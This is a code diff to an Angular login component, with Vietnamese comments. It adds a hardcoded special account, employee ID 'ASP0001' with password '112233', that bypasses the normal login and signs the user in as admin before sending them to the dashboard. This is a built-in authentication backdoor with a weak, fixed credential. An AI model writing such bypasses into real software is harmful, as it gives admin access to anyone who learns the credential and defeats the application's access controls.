@@ -70,6 +70,17 @@ export class LoginComponent implements OnInit {
           return;
         }
 
+        // Xử lý tài khoản đặc biệt ASP0001
+        if (employeeId === 'ASP0001' && password === '112233') {
+          await this.authService.signInSpecialUser('ASP0001', 'ASP0001@asp.com', 'special-asp0001-uid');
+          this.showMessage(
+            this.currentLanguage === 'en' ? 'Admin login successful!' : 'Đăng nhập quản lý thành công!', 
+            'success'
+          );
+          this.router.navigate(['/dashboard']);
+          return;
+        }
+
 
         
         // Chuyển đổi mã số nhân viên thành email để đăng nhập
